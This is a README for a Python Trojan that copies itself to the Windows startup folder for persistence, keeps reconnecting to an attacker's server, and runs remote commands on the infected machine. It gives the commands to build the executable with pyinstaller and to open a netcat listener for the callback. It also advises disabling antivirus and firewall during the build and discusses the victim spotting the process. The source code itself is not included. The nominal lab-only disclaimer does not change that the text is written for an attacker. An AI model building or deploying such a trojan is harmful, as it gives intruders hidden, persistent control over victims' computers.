# Python Trojan

## Overview
This is a basic Trojan written in Python that establishes a persistent connection with a remote server, listens for commands, and executes them on the infected machine. It autoruns by copying itself to the Windows startup folder and continuously tries to reconnect if the connection is lost. The script uses threading to execute commands concurrently.

## Features
- Persistent connection attempts to the attacker's server.
- Remote command execution.
- Multi-threaded execution to handle commands asynchronously.

## Usage
1. Modify the IP (and, optionally, the port) of the code as needed.
   
2. Install the pyinstall library that will be used to generate the executable file:

   ```
   pip install pyinstall
   ```

4. Generate the executable:

   ```
   pyinstaller -F --clean -w trojan.py
   ```

Note: the file name can also be changed, as well as the icon. 

4. The attacker must leave a port listening on his machine to receive the connection:
   
   ```
   nc -lvp 443
   ```
   When connected, you will see something like:
   
   ```
   listening on [any] 443 ...
   10.0.2.4: inverse host lookup failed: Unknown host
   ```

Once the connection is received, the attacker will have persistent access to the victim's machine, thanks to the `autorun()` function, which ensures that the program is executed automatically whenever the system is started.


## ⚠ Disclaimer
Use this script only in controlled environments such as penetration testing labs, with explicit permission. Misuse of this tool for unauthorized access to systems is illegal and may result in severe consequences. **The risk is yours**.

## Observations
- The program has **low detectability** by antivirus software when first run. However, there is a possibility that the antivirus may detect suspicious activity during the creation of the executable. To minimize this risk, it is recommended to **disable the antivirus and firewall** while generating the executable. Additionally, over time, the antivirus may eventually recognize the executable as malicious.
- There is a risk that the victim may find the trojan in the **Task Manager**. If that happens, there’s nothing to do except attempt the connection again.
- Obviously, the victim must run the Trojan on **Windows**.

